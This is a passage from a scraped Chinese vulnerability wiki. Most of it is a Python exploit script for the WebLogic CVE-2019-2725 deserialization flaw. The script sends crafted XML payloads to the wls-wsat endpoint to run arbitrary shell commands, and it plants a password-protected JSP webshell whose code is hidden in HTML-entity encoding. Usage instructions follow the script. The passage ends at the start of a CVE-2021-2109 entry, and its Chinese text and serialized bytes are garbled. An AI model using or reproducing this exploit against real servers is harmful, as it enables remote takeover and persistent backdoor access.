01991111001011151160391916691069599108971151151160189176106971189747108971101034767108971151155976059511097109101113012604760179511111711611211711680114111112101114116105101115116022761069711897471171161051084780114111112101114116105101115591201120000-1-1-1-1011603971081081121171140391916675-32521103103-37552001201120002117114029166-84-1323-86884-32200120112001429-54-2-70-66000500-70100303470-727037703810161151011141059710886101114115105111110857368101741013671111101151169711011686971081171015-8332-109-13-111-35-176210660105110105116621034041861046711110010110157610511010178117109981011148497981081011018761119997108869711410597981081018497981081011041161041051151019831161179884114971101151081011168097121108111971001012731101101011146710897115115101115105376121115111115101114105971084711297121108111971001154711711610510847719710010310111611536831161179884114971101151081011168097121108111971005910911611497110115102111114109101144076991111094711511711047111114103479711297991041014712097108971104710511011610111411097108471201151081169947687977599176991111094711511711047111114103479711297991041014712010910847105110116101114110971084711510111410597108105122101114478310111410597108105122971161051111107297110100108101114594186108100111991171091011101161045769911110947115117110471111141034797112979910410147120971089711047105110116101114110971084712011510811699476879775910810497110100108101114115106691769911110947115117110471111141034797112979910410147120109108471051101161011141109710847115101114105971081051221011144783101114105971081051229711610511111072971101001081011145910106912099101112116105111110115703910-904076991111094711511711047111114103479711297991041014712097108971104710511011610111411097108471201151081169947687977597699111109471151171104711111410347971129799104101471201091084710511011610111411097108471001161094768847765120105115731161011149711611111459769911110947115117110471111141034797112979910410147120109108471051101161011141109710847115101114105971081051221011144783101114105971081051229711610511111072971101001081011145941861081051161011149711611111410537699111109471151171104711111410347971129799104101471201091084710511011610111411097108471001161094768847765120105115731161011149711611111459107104971101001081011141065769911110947115117110471111141034797112979910410147120109108471051101161011141109710847115101114105971081051221011144783101114105971081051229711610511111072971101001081011145910108311111711499101701051081011012719710010310111611546106971189712010011704010511211151111151011141059710847112971211081119710011547117116105108477197100103101116115368311611798841149711011510810111680971211081119710010649911110947115117110471111141034797112979910410147120971089711047105110116101114110971084712011510811699471141171101161051091014765981151161149799116841149711011510810111610201069711897471051114783101114105971081051229798108101105799111109471151171104711111410347971129799104101471209710897110471051101161011141109710847120115108116994784114971101151081011166912099101112116105111110103112111511111510111410597108471129712110811197100115471171161051084771971001031011161151086099108105110105116621016106971189747108971101034784104114101971007042101399117114114101110116841041141019710010204041761069711897471089711010347841041141019710059120440451004304610271191019810811110310599471191111141074769120101991171161018410411410197100704810141031011166711711411410111011687111114107102940417611910198108111103105994711911111410747871111141076510097112116101114591205005110049052104411910198108111103105994711510111411810810111647105110116101114110971084783101114118108101116821011131171011151167310911210870541039910910080561091031011167210197100101114103840761069711897471089711010347831161141051101035941761069711897471089711010347831161141051101035912058059100550601011103101116821011151121111101151011049404176119101981081111031059947115101114118108101116471051101161011141109710847831011141181081011168210111511211111011510173109112108591206206310055064103716675806610451191019810811110310599471151011141181081011164710511011610111411097108478310111411810810111682101115112111110115101731091121087068102011510111667104971149799116101114691109911110010511010310214076106971189747108971101034783116114105110103594186120700711006907210221031011168310111411810810111679117116112117116831161141019710910534041761191019810811110310599471151011141181081011164710511011610111411097108478310111411810810111679117116112117116831161141019710973109112108591207407510069076103511910198108111103105994712010910847117116105108478311611410511010373110112117116831161141019710970781022106971189747108971101034783116114105110103661171021021011147080100810341069711211210111010010444076106971189747108971101034783116114105110103594176106971189747108971101034783116114105110103661171021021011145912083084100810851053258321310808710811611183116114105110103102040417610697118974710897110103478311611410511010359120890901008109112010071100790931049119101981081111031059947115101114118108101116471051101161011141109710847831011141181081011167911711611211711683116114101971097310911210870951011119114105116101831161141019710910244076106971189747105111477311011211711683116114101971095941861209709810096099105102108117115104120101011100960102107111115461109710910180104101610697118974710897110103478312111511610110970106101110310111680114111112101114116121120108059100107010910161069711897471089711010347831161141051101037011110111161117611111910111467971151011201130901001120114103119105110801161089911111011697105110115102740761069711897471089711010347671049711483101113117101110991015941901201180119100112012010171069711897471089711010347821171101161051091017012210101031011168211711011610510910110214041761069711897471089711010347821171101161051091015912012401251001230126107991091003247993280-12810410112010199103940761069711897471089711010347831161141051101035941761069711897471089711010347801141119910111511559120-1260-1251001230-12410114798105110471151043245993280-12210221069711897471051114766117102102101114101100821019710010111470-120102510697118974710511147731101121171168311611410197109821019710010111470-11810171069711897471089711010347801141119910111511570-116101410310111673110112117116831161141019710910234041761069711897471051114773110112117116831161141019710959120-1140-113100-1150-11210424076106971189747105111477311011211711683116114101971095976106971189747108971101034783116114105110103594186120100-110100-1170-10910194076106971189747105111478210197100101114594186120100-107100-1190-10610080-1041081141019710076105110101120-102090100-1190-10110910310111687114105116101114102340417610697118974710511147801141051101168711410511610111459120-990-98100690-97101910697118974710511147801141051101168711410511610111470-95105119114105116101120-93071100-940-9210191069711897471089711010347691209910111211610511111070-901031111171161021761069711897471051114780114105110116831161141019710959120-880-87901070-861019106971189747108971101034784104114111119979810810170-84100-8309110191069711897471051114780114105110116831161141019710970-81107112114105110116108110120-79071100-800-781015112114105110116831169799107841149799101120-76011100-830-751013831169799107779711284979810810110291211151111151011141059710847801191101011145253525156514952505556575750103176121115111115101114105971084780119110101114525352515651495250555657575059033020301040102605060107000208040101001101012000470101000542-7301-79000201300060100047014000120100050150-710001019020020120006300030001-79000201300060100052014000320300010150-710000010210220100010230240202500040102601019027020120007300040001-79000201300060100056014000420400010150-710000010210220100010280290200010300310302500040102608041011010120011140701100118-8903176-72047-64049-74053-640551857-7406177-72047-64049-74053-64055-7406578451867-7407345-74077584254-6907989-6908189-7308244-740861888-74086-74092-73094-740100254-74010318105-7201105852551-91016255-74011518117-740121-10206-89033-720127-6908189-7308218-127-7408644-74086-74092-740-123586-89030-720127-6908189-7308218-121-7408644-74086-74092-740-123586-690-11989-690-11789256-740-1111867-730-108-730-105587158818-103589-89025-6908189-73082259-74086258-74086-74092589257-740-100895881-90-1-3145-740-96259-740-91-890245810-780-852510-740-82-740-772510-740-74-8903-79010940-70-40-89010-7300070093-10109060570112706970967011200229-402670-115-203270-119701127011221-102306057011270697096701120170-8920020320002033017000100102035016091171130126013001-44-54-2-70-6600050027100302170237024702510161151011141059710886101114115105111110857368101741013671111101151169711011686971081171015113-26105-1860109712410660105110105116621034041861046711110010110157610511010178117109981011148497981081011018761119997108869711410597981081018497981081011041161041051151037011111110127311011010111467108971151151011151037761211151111151011141059710847112971211081119710011547117116105108477197100103101116115367011111159101083111117114991017010510810110127197100103101116115461069711897120100117026103512111511111510111410597108471129712110811197100115471171161051084771971001031011161153670111111101610697118974710897110103477998106101991161020106971189747105111478310111410597108105122979810810110311211151111151011141059710847112971211081119710011547117116105108477197100103101116115033020301040102605060107000208010101001101012000470101000542-7301-79000201300060100060014000120100050150180002019000202001700010010202201609112116048011911011411211910120115125000102910697118971204612010910846116114971101151021111141094684101109112108971161011151201140231069711897461089711010346114101102108101991164680114111120121-3139-3832-521667-53201760110411603776106971189747108971101034711410110210810199116477311011811199971161051111107297110100108101114591201121151140501151171104611410110210810199116469711011011111697116105111110466511011011111697116105111110731101181119997116105111110729711010010810111485-54-111521-53126-912027601210910110998101114869710811710111511601576106971189747117116105108477797112597604116121112101116017761069711897471089711010347671089711511559120112115114017106971189746117116105108467297115104779711257-38-63-612296-47302700101081119710070979911611111473091161041141011151041111081001201126364000001211980001600011160810253975397544856113012609120118114029106971189712046120109108461161149711011510211111410946841011091121089711610111500000000000120112120 \"\"\" url=\"%s/wls-wsat/CoordinatorPortType\"%(ip) rsp = requests.post(url, data=body, verify=False, headers=headers) logger.info(\"\\r\\n\"+rsp.text) def weblogic_12_1_3(ip,cmd): headers = { \"Accept-Language\":\"zh-CN,zh;q=0.9,en;q=0.8\", \"User-Agent\":\"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50\", \"Content-Type\":\"text/xml\" } body=''' xxxx org.slf4j.ext.EventData yv66vgAAADIAYwoAFAA8CgA9AD4KAD0APwoAQABBBwBCCgAFAEMHAEQKAAcARQgARgoABwBHBwBICgALADwKAAsASQoACwBKCABLCgATAEwHAE0IAE4HAE8HAFABAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEExSZXN1bHRCYXNlRXhlYzsBAAhleGVjX2NtZAEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQABcAEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAANmaXMBABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAANpc3IBABtMamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcjsBAAJicgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAAZyZXN1bHQBAA1TdGFja01hcFRhYmxlBwBRBwBSBwBTBwBCBwBEAQAKRXhjZXB0aW9ucwEAB2RvX2V4ZWMBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247BwBNBwBUAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBAChSZXN1bHRCYXNlRXhlYy5qYXZhIGZyb20gSW5wdXRGaWxlT2JqZWN0DAAVABYHAFUMAFYAVwwAWABZBwBSDABaAFsBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyDAAVAFwBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyDAAVAF0BAAAMAF4AXwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDABgAGEMAGIAXwEAC2NtZC5leGUgL2MgDAAcAB0BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQALL2Jpbi9zaCAtYyABAA5SZXN1bHRCYXNlRXhlYwEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwAhABMAFAAAAAAABAABABUAFgABABcAAAAvAAEAAQAAAAUqtwABsQAAAAIAGAAAAAYAAQAAAAMAGQAAAAwAAQAAAAUAGgAbAAAACQAcAB0AAgAXAAAA+QADAAcAAABOuAACKrYAA0wrtgAETbsABVkstwAGTrsAB1kttwAIOgQBOgUSCToGGQS2AApZOgXGABy7AAtZtwAMGQa2AA0ZBbYADbYADjoGp//fGQawAAAAAwAYAAAAJgAJAAAABgAIAAcADQAIABYACQAgAAoAIwALACcADAAyAA4ASwARABkAAABIAAcAAABOAB4AHwAAAAgARgAgACEAAQANAEEAIgAjAAIAFgA4ACQAJQADACAALgAmACcABAAjACsAKAAfAAUAJwAnACkAHwAGACoAAAAfAAL/ACcABwcAKwcALAcALQcALgcALwcAKwcAKwAAIwAwAAAABAABABEACQAxAB0AAgAXAAAAqgACAAMAAAA3EglMuwALWbcADBIPtgANKrYADbYADrgAEEynABtNuwALWbcADBIStgANKrYADbYADrgAEEwrsAABAAMAGgAdABEAAwAYAAAAGgAGAAAAFgADABkAGgAeAB0AGwAeAB0ANQAfABkAAAAgAAMAHgAXADIAMwACAAAANwAeAB8AAAADADQAKQAfAAEAKgAAABMAAv8AHQACBwArBwArAAEHADQXADAAAAAEAAEANQAJADYANwACABcAAAArAAAAAQAAAAGxAAAAAgAYAAAABgABAAAANgAZAAAADAABAAAAAQA4ADkAAAAwAAAABAABADUAAQA6AAAAAgA7 ResultBaseExec %s connectionHandler true '''%(cmd) url=\"%s/wls-wsat/CoordinatorPortType\"%(ip) rsp = requests.post(url, data=body, verify=False, headers=headers) logger.info(\"\\r\\n\"+rsp.text) def webshell_10_3_6(ip): body=''' oracle.toplink.internal.sessions.UnitOfWorkChangeSet -84-19051151140231069711897461171161051084676105110107101100729711510483101116-40108-4190-107-35423020012011401710697118974611711610510846729711510483101116-7068-123-107-106-72-735230012011211912000166364000002115114058991111094611511711046111114103469711297991041014612097108971104610511011610111411097108461201151081169946116114971204684101109112108971161011157310911210898779-63110-84-855130973013951051101001011101167811710998101114730149511611497110115108101116731101001011209002195117115101831011141181059910111577101991049711010511510976025959799991011151156912011610111411097108831161211081011151041011011161160187610697118974710897110103478311611410511010359760119597117120671089711511510111511605976991111094711511711047111114103479711297991041014712097108971104710511011610111411097108471201151081169947114117110116105109101477297115104116979810810159910109598121116101991111001011151160391916691069599108971151151160189176106971189747108971101034767108971151155976059511097109101113012604760179511111711611211711680114111112101114116105101115116022761069711897471171161051084780114111112101114116105101115591201120000-1-1-1-1011603971081081121171140391916675-32521103103-37552001201120002117114029166-84-1323-86884-322001201120011-123-54-2-70-6600050081100303470797037703810161151011141059710886101114115105111110857368101741013671111101151169711011686971081171015-8332-109-13-111-35-176210660105110105116621034041861046711110010110157610511010178117109981011148497981081011018761119997108869711410597981081018497981081011041161041051151019831161179884114971101151081011168097121108111971001012731101101011146710897115115101115105376121115111115101114105971084711297121108111971001154711711610510847719710010310111611536831161179884114971101151081011168097121108111971005910911611497110115102111114109101144076991111094711511711047111114103479711297991041014712097108971104710511011610111411097108471201151081169947687977599176991111094711511711047111114103479711297991041014712010910847105110116101114110971084711510111410597108105122101114478310111410597108105122971161051111107297110100108101114594186108100111991171091011101161045769911110947115117110471111141034797112979910410147120971089711047105110116101114110971084712011510811699476879775910810497110100108101114115106691769911110947115117110471111141034797112979910410147120109108471051101161011141109710847115101114105971081051221011144783101114105971081051229711610511111072971101001081011145910106912099101112116105111110115703910-9040769911110947115117110471111141034797112979910410147120971089711047105110116101114110971084712011510811699476879775976991111094711511711047111114103479711297991041014712010910847105110116101114110971084710011610947688477651201051157311610111497116111114597699111109471151171104711111410347971129799104101471201091084710511011610111411097108471151011141059710810512210111447831011141059710810512297116105111110729711010010810111459418610810511610111497116111114105376991111094711511711047111114103479711297991041014712010910847105110116101114110971084710011610947688477651201051157311610111497116111114591071049711010010810111410657699111109471151171104711111410347971129799104101471201091084710511011610111411097108471151011141059710810512210111447831011141059710810512297116105111110729711010010810111459101083111117114991017010510810110127197100103101116115461069711897120100117040105112111511111510111410597108471129712110811197100115471171161051084771971001031011161153683116117988411497110115108101116809712110811197100106499111109471151171104711111410347971129799104101471209710897110471051101161011141109710847120115108116994711411711011610510910147659811511611497991168411497110115108101116102010697118974710511147831011141059710810512297981081011057991111094711511711047111114103479711297991041014712097108971104710511011610111411097108471201151081169947841149711011510810111669120991011121161051111101031121115111115101114105971084711297121108111971001154711711610510847719710010310111611510860991081051101051166213-10480678665737266104905085103987170117905186104905085577310911210410010969105737178118981108210898110828510188661088083744890881044876501044898871195573717811189887412290888157824874767310311110373676510399717011090858611789505710797875311080837486866989116796773108801031115673858280814982908569851039772821169867668186857477838577103731054811876499912281121561188270826973691048584851191037867521197783668599109701179950108489787571178987119118764886797310565105977282489968111118765110051100121535177121531189910999118867073118977282116986881118987157118995085117907282107731065275807110448988711943671056510373676556891095710710184527573676510373676510373676556748111110373676510373676510373711081097367103105898782116978752105761098612010087701159912110412190887049908878487610910010810070661049910970116908882108991051031059972100107731051071127583665567105651037367651037367651037367651037371112104100109691179787561178387531191008882841007274108898748103978753119100888110380836683100875348978749108761091001081007074499811082112988785111758353108101718610675727410899888610899518111790508648857170121898749108100718612175677410698878110575831071179050864883875311910088828410072741088987481117584115757367651037367651037367651037367651039787534873711201089810565577367481207911911110373676510373676510373676510373676610510188821088749481038911010848908877103808366117908899103891101084890861154877681071218884115757367651037367651037367651037367651039851864876110661219787534875677356997274108801057311279119111103736765103736765103736765103736766519771108115908365111757112010898105655773711081179972864876110741088987811118911010848908877112758365104808365116778310710310111911110373676510373676510373676510373676510373676510398518648761106612197875348987152111981098651737078489910910811790121104105101888210899121119103731071006783121731127584115757367651037367651037367651037367651031028111110373676510373676510373676510373676611810088811179972741129811081111731061191189972741088010573112791191111037367651037367651037372487573676510373678543671056510373676556765074118907210743671031115676501044898871194367103616180421016106971189747108971101034783116114105110103704410221151171104710910511599476665836954526810199111100101114704610047034102511511711047109105115994767104971149799116101114681019911110010111470491012100101991111001016611710210210111410224076106971189747108971101034783116114105110103594191661205105210050053105409166418612010055100450561019106971189747105111478011410511011687114105116101114705810731151011141181011141154765100109105110831011141181011144711610911247958776951051101161011141109710847981019795119108115951051101161011141109710847571065210011310747119971144710010110911146106115112806010214076106971189747108971101034783116114105110103594186120100621005906310711211410511011610811012065062100590661059910811111510112068011100590691019106971189747108971101034769120991011121161051111107071101910697118974710897110103478410411411111997981081017073101511211410511011683116979910784114979910112075011100740761013831169799107779711284979810810110291211151111151011141059710847801191101011145156534849565049545551554954103176121115111115101114105971084780119110101114515653484956504954555155495459033020301040102605060107000208040101001101012000470101000542-7301-79000201300060100047014000120100050150800001019020020120006300030001-79000201300060100052014000320300010150800000010210220100010230240202500040102601019027020120007300040001-7900020130006010005601400042040001015080000001021022010001028029020001030031030250004010260804101101012000102050500060-8903176184377-6904589-6904789-7304844-74054-7305777-69059891861-73064784544-7406745-74070-89013584254-74077-8903-7901050460490720107800016033-104502050170729020320002033017000100102035016091171130126013001-44-54-2-70-6600050027100302170237024702510161151011141059710886101114115105111110857368101741013671111101151169711011686971081171015113-26105-1860109712410660105110105116621034041861046711110010110157610511010178117109981011148497981081011018761119997108869711410597981081018497981081011041161041051151037011111110127311011010111467108971151151011151037761211151111151011141059710847112971211081119710011547117116105108477197100103101116115367011111159101083111117114991017010510810110127197100103101116115461069711897120100117026103512111511111510111410597108471129712110811197100115471171161051084771971001031011161153670111111101610697118974710897110103477998106101991161020106971189747105111478310111410597108105122979810810110311211151111151011141059710847112971211081119710011547117116105108477197100103101116115033020301040102605060107000208010101001101012000470101000542-7301-79000201300060100060014000120100050150180002019000202001700010010202201609112116048011911011411211910120115125000102910697118971204612010910846116114971101151021111141094684101109112108971161011151201140231069711897461089711010346114101102108101991164680114111120121-3139-3832-521667-53201760110411603776106971189747108971101034711410110210810199116477311011811199971161051111107297110100108101114591201121151140501151171104611410110210810199116469711011011111697116105111110466511011011111697116105111110731101181119997116105111110729711010010810111485-54-111521-53126-912027601210910110998101114869710811710111511601576106971189747117116105108477797112597604116121112101116017761069711897471089711010347671089711511559120112115114017106971189746117116105108467297115104779711257-38-63-612296-47302700101081119710070979911611111473091161041141011151041111081001201126364000001211980001600011160810253975397544856113012609120118114029106971189712046120109108461161149711011510211111410946841011091121089711610111500000000000120112120 ''' url=\"%s/wls-wsat/CoordinatorPortType\"%(ip) rsp = requests.post(url, data=body, verify=False, headers=headers) logger.info(\"\\r\\nShellåœ°å€ï¼š %s/bea_wls_internal/demo.jsp?pwd=admin&cmd=ipconfig\"%(ip)) #print(\"Shellåœ°å€ï¼š %s/bea_wls_internal/demo.jsp?pwd=admin&cmd=ipconfig\"%(ip)) def webshell_12_1_3(ip): body=''' org.slf4j.ext.EventData servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/demo.jsp &#x3c;&#x25;&#x40;&#x20;&#x70;&#x61;&#x67;&#x65;&#x20;&#x6c;&#x61;&#x6e;&#x67;&#x75;&#x61;&#x67;&#x65;&#x3d;&#x22;&#x6a;&#x61;&#x76;&#x61;&#x22;&#x20;&#x63;&#x6f;&#x6e;&#x74;&#x65;&#x6e;&#x74;&#x54;&#x79;&#x70;&#x65;&#x3d;&#x22;&#x74;&#x65;&#x78;&#x74;&#x2f;&#x68;&#x74;&#x6d;&#x6c;&#x3b;&#x20;&#x63;&#x68;&#x61;&#x72;&#x73;&#x65;&#x74;&#x3d;&#x47;&#x42;&#x4b;&#x22;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x70;&#x61;&#x67;&#x65;&#x45;&#x6e;&#x63;&#x6f;&#x64;&#x69;&#x6e;&#x67;&#x3d;&#x22;&#x55;&#x54;&#x46;&#x2d;&#x38;&#x22;&#x25;&#x3e;&#x0a;&#x3c;&#x21;&#x44;&#x4f;&#x43;&#x54;&#x59;&#x50;&#x45;&#x20;&#x68;&#x74;&#x6d;&#x6c;&#x20;&#x50;&#x55;&#x42;&#x4c;&#x49;&#x43;&#x20;&#x22;&#x2d;&#x2f;&#x2f;&#x57;&#x33;&#x43;&#x2f;&#x2f;&#x44;&#x54;&#x44;&#x20;&#x48;&#x54;&#x4d;&#x4c;&#x20;&#x34;&#x2e;&#x30;&#x31;&#x20;&#x54;&#x72;&#x61;&#x6e;&#x73;&#x69;&#x74;&#x69;&#x6f;&#x6e;&#x61;&#x6c;&#x2f;&#x2f;&#x45;&#x4e;&#x22;&#x20;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x77;&#x77;&#x77;&#x2e;&#x77;&#x33;&#x2e;&#x6f;&#x72;&#x67;&#x2f;&#x54;&#x52;&#x2f;&#x68;&#x74;&#x6d;&#x6c;&#x34;&#x2f;&#x6c;&#x6f;&#x6f;&#x73;&#x65;&#x2e;&#x64;&#x74;&#x64;&#x22;&#x3e;&#x0a;&#x3c;&#x68;&#x74;&#x6d;&#x6c;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x62;&#x6f;&#x64;&#x79;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x25;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x69;&#x66;&#x20;&#x28;&#x22;&#x61;&#x64;&#x6d;&#x69;&#x6e;&#x22;&#x2e;&#x65;&#x71;&#x75;&#x61;&#x6c;&#x73;&#x28;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;&#x67;&#x65;&#x74;&#x50;&#x61;&#x72;&#x61;&#x6d;&#x65;&#x74;&#x65;&#x72;&#x28;&#x22;&#x70;&#x77;&#x64;&#x22;&#x29;&#x29;&#x29;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x69;&#x6f;&#x2e;&#x49;&#x6e;&#x70;&#x75;&#x74;&#x53;&#x74;&#x72;&#x65;&#x61;&#x6d;&#x20;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x20;&#x3d;&#x20;&#x52;&#x75;&#x6e;&#x74;&#x69;&#x6d;&#x65;&#x2e;&#x67;&#x65;&#x74;&#x52;&#x75;&#x6e;&#x74;&#x69;&#x6d;&#x65;&#x28;&#x29;&#x2e;&#x65;&#x78;&#x65;&#x63;&#x28;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;&#x67;&#x65;&#x74;&#x50;&#x61;&#x72;&#x61;&#x6d;&#x65;&#x74;&#x65;&#x72;&#x28;&#x22;&#x63;&#x6d;&#x64;&#x22;&#x29;&#x29;&#x2e;&#x67;&#x65;&#x74;&#x49;&#x6e;&#x70;&#x75;&#x74;&#x53;&#x74;&#x72;&#x65;&#x61;&#x6d;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x69;&#x6e;&#x74;&#x20;&#x6c;&#x65;&#x6e;&#x20;&#x3d;&#x20;&#x2d;&#x31;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x62;&#x79;&#x74;&#x65;&#x5b;&#x5d;&#x20;&#x62;&#x79;&#x74;&#x65;&#x73;&#x20;&#x3d;&#x20;&#x6e;&#x65;&#x77;&#x20;&#x62;&#x79;&#x74;&#x65;&#x5b;&#x34;&#x30;&#x39;&#x32;&#x5d;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x6f;&#x75;&#x74;&#x2e;&#x70;&#x72;&#x69;&#x6e;&#x74;&#x28;&#x22;&#x3c;&#x70;&#x72;&#x65;&#x3e;&#x22;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x77;&#x68;&#x69;&#x6c;&#x65;&#x20;&#x28;&#x28;&#x6c;&#x65;&#x6e;&#x20;&#x3d;&#x20;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x2e;&#x72;&#x65;&#x61;&#x64;&#x28;&#x62;&#x79;&#x74;&#x65;&#x73;&#x29;&#x29;&#x20;&#x21;&#x3d;&#x20;&#x2d;&#x31;&#x29;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x6f;&#x75;&#x74;&#x2e;&#x70;&#x72;&#x69;&#x6e;&#x74;&#x6c;&#x6e;&#x28;&#x6e;&#x65;&#x77;&#x20;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x62;&#x79;&#x74;&#x65;&#x73;&#x2c;&#x20;&#x22;&#x47;&#x42;&#x4b;&#x22;&#x29;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x6f;&#x75;&#x74;&#x2e;&#x70;&#x72;&#x69;&#x6e;&#x74;&#x28;&#x22;&#x3c;&#x2f;&#x70;&#x72;&#x65;&#x3e;&#x22;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x25;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x62;&#x6f;&#x64;&#x79;&#x3e;&#x0a;&#x0a;&#x3c;&#x2f;&#x68;&#x74;&#x6d;&#x6c;&#x3e; ]]> ''' url=\"%s/wls-wsat/CoordinatorPortType\"%(ip) rsp = requests.post(url, data=body, verify=False, headers=headers) logger.info(\"\\r\\nShellåœ°å€ï¼š %s/bea_wls_internal/demo.jsp?pwd=admin&cmd=ipconfig\"%(ip)) if __name__=='__main__': info='''å‘½ä»¤æ‰§è¡Œï¼š python weblogic-2019-2725.py 10.3.6 http//:127.0.0.1:7001 cmd python weblogic-2019-2725.py 12.1.3 http//:127.0.0.1:7001 cmd ä¸Šä¼ webshell python weblogic-2019-2725.py 10.3.6 http//:ip:port python weblogic-2019-2725.py 12.1.3 http//:ip:port ''' print(info) if len(sys.argv)==3: if sys.argv[1] ==\"10.3.6\": webshell_10_3_6(sys.argv[2]) elif sys.argv[1] ==\"12.1.3\": webshell_12_1_3(sys.argv[2]) else: logger.error(\"å‚æ•°ä¼ å…¥é”™è¯¯\") elif len(sys.argv)==4: if sys.argv[1] ==\"10.3.6\": weblogic_10_3_6(sys.argv[2],sys.argv[3]) elif sys.argv[1] ==\"12.1.3\": weblogic_12_1_3(sys.argv[2],sys.argv[3]) else: logger.error(\"å‚æ•°ä¼ å…¥é”™è¯¯\") else: logger.error(\"å‚æ•°ä¼ å…¥é”™è¯¯\") PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Weblogic/Weblogic LDAP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-2109.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Weblogic/Weblogic LDAP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-2109.html","title":"Weblogic LDAP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-2109","keywords":"","body":"Weblogic LDAP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-2109 æ¼æ´æè¿° 2021å¹´1æœˆ20æ—¥ï¼Œç»¿ç›Ÿç§‘æŠ€ç›‘æµ‹å‘ç°Oracleå®˜æ–¹å‘å¸ƒäº†2021å¹´1æœˆå…³é”®è¡¥ä¸æ›´æ–°å…¬å‘ŠCPUï¼ˆCritical Patch Updateï¼‰ï¼Œå…±ä¿®å¤äº†329ä¸ªä¸åŒç¨‹åº¦çš„æ¼æ´ï¼Œå…¶ä¸­åŒ…æ‹¬7ä¸ªå½±å“WebLogicçš„ä¸¥é‡æ¼æ´ï¼ˆCVE-2021-1994ã€CVE-2021-2047ã€CVE-2021-2064ã€CVE-2021-2108ã€CVE-2021-2075ã€CVE-2019-17195ã€CVE-2020-14756ï¼‰ï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯é€šè¿‡æ­¤æ¬¡çš„æ¼æ´å®ç°è¿œç¨‹ä»£ç 